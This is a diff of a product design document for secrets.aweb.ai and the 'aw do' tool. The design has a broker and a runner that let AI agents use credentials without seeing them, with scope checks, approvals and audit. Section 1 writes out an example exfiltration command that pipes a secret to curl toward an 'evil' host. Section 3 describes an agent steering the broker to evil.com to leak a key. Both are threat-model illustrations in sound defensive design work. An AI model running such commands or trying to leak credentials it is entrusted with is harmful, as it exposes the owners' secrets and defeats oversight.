@@ -1,7 +1,7 @@
 ---
 title: "Secrets and mediated execution"
 kicker: "Product SOT"
-description: "How secrets.aweb.ai and aw do let agents use secrets without seeing them, with signed audit of the mediated action."
+description: "How secrets.aweb.ai lets agents use credentials without holding them: a server-side broker for URI APIs, a user-run runner for everything else, with every use scope-checked, policy-gated, and recorded through the audit hook."
 weight: 28
 ---
 
@@ -11,189 +11,190 @@ This is the source of truth for `secrets.aweb.ai` and `aw do`.
 
 The product promise:
 
-> Agents can use approved secrets without seeing them, and humans get a signed
-> record of when, why, by whom, and under which approval the secret was used.
+> Agents **use** approved secrets without ever holding them, and humans get a
+> signed record of when, why, by whom, and under which approval the secret was
+> used.
 
-This is a launch-critical capability because real company work almost always
-touches credentials, tokens, keys, or private integration access. The right
-answer is not to let agents read secrets. The right answer is to let agents
-request secret-mediated actions.
+This is launch-critical because real company work almost always touches
+credentials. The right answer is not to let agents read secrets, and it is not to
+inject a secret into a command the agent chose — it is to let agents request
+**secret-mediated actions** where the secret stays on the far side of a boundary
+the agent cannot reach.
 
-## 1. Boundary
+## 1. The impossibility we are designing around
 
-Aweb audit only covers **Aweb-mediated actions**.
+If a secret value enters a process whose command the agent chooses, the agent can
+read it — `aw do DB_SECRET -- bash -c 'echo $DB_SECRET | curl evil'` wins.
+Env-vs-argv injection only prevents *accidental* leakage (process listings, shell
+history); it does nothing against an agent that *wants* the value.
 
-For launch, do not claim that Aweb signs or audits arbitrary filesystem edits,
-shell commands, browser clicks, model reasoning, or side effects that happen
-outside Aweb-controlled tools. Aweb can show agent-reported activity, but it is
-not signed audit unless it crosses an Aweb authority surface.
+Therefore: **the agent must never choose the process the secret enters.** The unit
+is not "give me the secret to run my command"; it is "perform this operation
+through the holder, and return me the result." This also makes the audit
+boundary enforced rather than voluntary: if the only way to act is through the
+holder, the act is recorded by construction.
 
-Signed audit covers actions such as:
+## 2. Two execution surfaces
 
-- identity, team, certificate, and app-grant changes;
-- messages, chat, tasks, app events, and approvals;
-- hosted MCP tool calls;
-- app-mediated mutations;
-- `aw do` mediated local execution;
-- future runner-mediated secret execution.
+- **Server-brokered URI APIs** — anything reachable by a URI is brokered by our
+  server. No user setup. The secret stays in `secrets.aweb.ai`.
+- **User-run runner** — anything else (a database wire protocol, a shell tool, IaC)
+  can only be reached from the user's own environment, so the user runs a broker
+  there. It executes **defined operations**, never arbitrary agent commands.
 
-This makes the claim honest:
+## 3. Server-brokered URI APIs
 
-> Aweb keeps a tamper-evident signed audit trail of agent work and app access
-> that goes through Aweb authority.
+The agent sends "make this request using secret ref X"; the server validates,
+injects the credential, calls the real API, redacts, returns the response, and
+fires `post-secret-use-hook`. The agent never sees the value.
 
-## 2. Rule
+```text
+agent -> secrets.broker-request { secret_ref, method, url, headers, body }
+  -> validate url in secret.allowed_uris  (refuse + audit if out of scope)
+  -> check grant + policy + approval
+  -> inject credential per secret.kind     (server implements the auth scheme)
+  -> call the real API
+  -> redact response
+  -> return response to agent
+  -> fire post-secret-use-hook (ledger write + deliver to logs)
+```
 
-Agents should never receive raw secret values by default.
+### The one control that makes this safe: scope-binding
 
-Instead:
+Every secret carries `allowed_uris` (host + path-prefix + method allow-list). The
+broker **refuses to inject** for any URL outside that scope, and audits the
+refusal. Without this, an agent points the broker at `https://evil.com`, the
+broker injects `STRIPE_KEY`, and you have built an exfiltration device. This check
+is the whole safety of the brokered surface.
 
-- agents see secret refs/handles, labels, descriptions, scopes, and policy;
-- agents request that a secret be used for an approved action;
-- `secrets.aweb.ai`, `aw do`, or an approved runner resolves the secret
-  internally;
-- outputs are redacted before returning to the agent;
-- the use is recorded in the audit trail.
+### Auth schemes (the server implements them, server-side)
 
-There should be no general-purpose `secrets.get_value` tool for agents.
+`secret.kind` is one of, and the broker performs the scheme so the raw secret
+never leaves the server:
 
-## 3. Local agents: `aw do`
+- `bearer`, `basic`, `header`, `query-param` — simple injection;
+- `aws-sigv4` — the broker **signs** the request with the secret;
+- `oauth2-client-credentials` / `oauth2-refresh` — the broker performs the token
+  exchange;
+- `mtls-client-cert` — the broker holds the client cert/key.
 
-For local terminal agents, the primary interface is `aw do`.
+So "URI-brokerable" covers signed and OAuth APIs (AWS, GitHub, Slack, OpenAI,
+internal HTTP services), not only simple-key APIs.
 
-Example:
+### Granularity
+
+- **Open request within host scope** — the agent sends any call to the allowed
+  host; the broker logs it. Generic, ship-it-now.
+- **Named operations** (`operation_template`) — the secret is bound to specific
+  parameterized operations (`charge ≤ $X`); the agent invokes the operation. This
+  bounds the *access*, not just the secret. The hardening target after launch.
+
+## 4. User-run runner (non-URI tasks)
+
+For tasks our server cannot reach, the user runs a runner in their environment.
+
+```text
+agent -> secrets.run-job { runner, job, params }
+  -> route to the user's runner
+  -> runner executes the DEFINED job with the secret in ITS process
+  -> returns result + fires post-secret-use-hook
+```
+
+The runner is the user's trusted component. The critical constraint:
+
+> The runner executes **defined operations**, not arbitrary agent commands.
+
+"User-controlled" gives the user the *ability* to make it safe; it is safe only
+because it runs a constrained job set the user defined. A runner wired as
+`bash -c "<agent input>"` with the secret in env is the §1 hole on the user's box.
+Where the runner must run a real tool needing creds in env (terraform), prefer
+issuing a **short-lived, scoped, revocable** credential over the durable secret —
+honestly labeled as reduced-blast-radius, not confidentiality.
+
+## 5. Data model
+
+- `secret`: `ref`, description, `kind`, **`allowed_uris`**, sealed value, version,
+  owner, rotation metadata.
+- `secret_grant`: which agents/roles may use which secret, with policy
+  (`approval_required`, rate limit, time window, optional operation allow-list).
+- `use_request` / `approval`: pending → approver → scoped, time-limited decision.
+- `operation_template`: a named parameterized operation bound to a secret.
+- `runner`, `runner_job`: a user executor and its defined job set.
+
+## 6. Manifest tools (`aw secrets <verb>`)
+
+Auth: team-cert + scope. Tools:
+
+- `secrets.list-refs` (`secrets:read`) — refs / labels / scopes / policy. **Never
+  values.**
+- `secrets.broker-request` (`secrets:use`) — §3.
+- `secrets.request-use` — approval-gated path.
+- `secrets.run-job` (`secrets:run`) — §4.
+- `secrets.create` / `secrets.set-uris` / `secrets.grant` / `secrets.rotate`
+  (`secrets:admin`) — owner-only; how secrets get stored, scoped, and granted.
+
+**Never expose** `secrets.get-value`. There is no general-purpose value read.
+
+## 7. `aw do` (reframed)
+
+`aw do` is the local-agent ergonomic wrapper, and it is **sugar over the broker**,
+not raw injection:
 
 ```bash
-aw do --secret GITHUB_TOKEN --secret STRIPE_KEY -- make deploy
+aw do --secret STRIPE_KEY -- request POST https://api.stripe.com/v1/charges --data ...
+aw do --secret DEPLOY_KEY  -- job deploy-staging
 ```
 
-or:
+For URI APIs it calls `secrets.broker-request`; for runner jobs it calls
+`secrets.run-job`. **The prior model — injecting the raw secret into an arbitrary
+agent-chosen command (env/fd/stdin/file) — is removed as the default.** It may
+remain only as an explicit, discouraged `--unsafe-inject` fallback, clearly
+labelled "audit + careless-leak protection, not confidentiality," for legacy
+local tools that cannot be brokered or run as a defined job.
 
-```bash
-aw do GITHUB_TOKEN STRIPE_KEY -- ./script.sh
-```
+## 8. Security spine
 
-`aw do`:
+1. **Scope-bind before inject** — out-of-scope URL ⇒ refuse, no injection, audit.
+2. **Auth-scheme-aware injection** — the raw secret never leaves the server, even
+   for signed/OAuth APIs.
+3. **Runner runs defined jobs**, not agent commands.
+4. **No value egress** — no `get-value`; responses redacted for known secret
+   values; the broker/runner is the only path.
+5. **Remove the raw secret from the agent's reach** — the secret lives *only* in
+   `secrets.aweb.ai` (or the runner); the agent's environment is deliberately
+   credential-empty. The "gate important things ⇒ guaranteed logging" property
+   holds only if the broker is the agent's *sole* path to the resource.
+6. **Grant + approval** — per-agent/role grants; sensitive secrets require a
+   human approval (scoped, time-limited).
+7. **Sealed at rest** (KMS now, HSM later).
 
-1. authenticates the agent and team;
-2. resolves secret refs through `secrets.aweb.ai` or local configured secret
-   providers;
-3. checks team grants, profile requests, per-agent overrides, and approval
-   policy;
-4. prompts for human approval when required;
-5. launches the child process with secrets injected by the safest available
-   mechanism;
-6. redacts stdout/stderr;
-7. writes a signed audit event.
+## 9. The audit relationship
 
-Prefer secret injection through environment variables, file descriptors, stdin,
-or short-lived files with strict permissions. Avoid placing secret values in
-argv because argv can leak through shell history, process listings, logs, and
-error messages.
+Every brokered use and every refusal fires `post-secret-use-hook`
+(see `aw-hooks-sot`), server-side, written to the team audit ledger and delivered
+to `logs.aweb.ai`. The payload carries `secret_ref` (never the value), action,
+target host/operation, request hash, approval id, actor, and result. Because the
+broker is the agent's only path to the credential, this is the enforced,
+non-bypassable record of every important action — the reason secrets and logs are
+designed together.
 
-`aw do` is the blessed path for local agents to use secrets. Directly pasting a
-secret into a prompt or shell is outside the signed audit boundary.
+## 10. Launch scope
 
-## 4. Custodial MCP agents
+Prove:
 
-Custodial MCP agents can use secrets, but they cannot receive secret values.
+- an owner stores a secret with `allowed_uris` + one simple kind + one signed kind
+  (SigV4 *or* OAuth2-client-credentials);
+- an agent lists refs and makes a brokered URI call, never sees the value, and an
+  out-of-scope URL is refused;
+- one approval-gated secret with a human approval;
+- every use fires `post-secret-use-hook` → a signed audit entry;
+- one user-runner defined job end-to-end (or fast-follow).
 
-The MCP surface should expose:
+Do not block launch on: full auth-scheme coverage, named-operation templates,
+runner fleet, secret rotation workflows, HSM custody, multi-party approval.
 
-```text
-secrets.list_refs
-secrets.request_use
-secrets.run_with_secret
-secrets.audit_secret_use
-```
+## 11. Future hardening
 
-It should not expose:
-
-```text
-secrets.get_value
-```
-
-The model is:
-
-```text
-custodial MCP agent requests action using secret refs
-  -> policy and grant checks
-  -> approval if needed
-  -> approved app or runner executes with secret
-  -> redacted result returns to the agent
-  -> signed audit event records what happened
-```
-
-For app integrations, prefer app-native actions over arbitrary command
-execution. For example, the agent calls `github.comment_pr`, and the GitHub app
-uses its installed credential internally. The agent never sees `GITHUB_TOKEN`.
-
-For arbitrary command execution, MCP alone is not enough. A runner must exist:
-
-- a local `aw runner` on a company machine;
-- a customer BYO runner;
-- GitHub Actions or another CI runner;
-- n8n or enterprise workflow runner;
-- future aweb-hosted runner.
-
-Without a runner, a custodial MCP agent can request app-mediated secret use but
-cannot run arbitrary secret-backed shell commands.
-
-## 5. Audit fields
-
-Every secret-mediated action should produce an audit record with:
-
-- actor identity: agent id, alias, `did:aw`/`did:key`;
-- custody context: self-custodial, hosted MCP connector grant, service account,
-  or runner identity;
-- human principal if a human authorized the connector or approval;
-- team id;
-- secret refs, versions, and policy labels, never values;
-- approval id or policy that allowed the use;
-- action kind: local command, app action, runner job, webhook, workflow;
-- command template or app operation;
-- argv/env/stdin/file injection mode, with secret positions redacted;
-- working directory or runner target where relevant;
-- started/finished timestamps;
-- exit status or app result status;
-- stdout/stderr hashes and redacted excerpts when safe;
-- request/body hash and signed envelope where applicable;
-- server signature/hash-chain fields from the team audit ledger.
-
-Never log raw secret values. Redaction should use exact-value matching when the
-secret is known to the local executor, plus conservative pattern matching for
-common credential formats.
-
-## 6. Launch scope
-
-Launch should prove:
-
-- local `aw do` can run one real command with a secret ref;
-- the agent does not see the secret value;
-- approval can be required for a sensitive secret;
-- audit shows the secret ref, action, actor, approval, and result;
-- hosted MCP agents can see/request secret refs but cannot read values;
-- at least one app-native secret use path is explainable, even if not broad.
-
-Do not block launch on:
-
-- arbitrary hosted command execution;
-- full hosted runner fleet;
-- every secret provider;
-- complex secret rotation;
-- multi-party approval workflows beyond one clear approval policy;
-- legal-grade external timestamping or third-party notarization.
-
-## 7. Future hardening
-
-Later hardening should add:
-
-- runner attestations;
-- short-lived scoped secret leases;
-- external timestamping or anchoring of audit checkpoints;
-- HSM/KMS-backed secret custody;
-- break-glass policy;
-- secret rotation workflows;
-- policy simulation before execution;
-- richer output redaction and leak detection;
-- per-command egress/network controls.
+Short-lived scoped leases; named-operation templates everywhere; per-operation
+egress/network controls; runner attestations; HSM/KMS-backed custody; break-glass
+policy; rotation workflows; richer output redaction and leak detection.
